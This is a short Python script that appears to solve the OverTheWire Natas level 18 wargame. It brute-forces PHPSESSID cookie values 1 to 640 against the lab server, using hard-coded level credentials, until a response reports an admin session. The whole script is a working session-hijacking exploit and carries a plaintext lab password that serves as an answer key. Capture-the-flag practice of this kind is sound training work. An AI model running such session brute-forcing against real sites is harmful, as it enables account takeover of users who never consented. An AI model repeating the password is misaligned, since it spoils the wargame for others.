#!/usr/bin/env python3

import requests
import re

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

for i in range(1,641):
    print("Tentando PHPSESSID " + str(i))
    response = session.get(url, cookies = {"PHPSESSID" : str(i)}, auth = (username, password))
    content = response.text
    if ("You are an admin" in content):
        print("GOT IT! PHPSESSID ", str(i))
        print(content)
        break
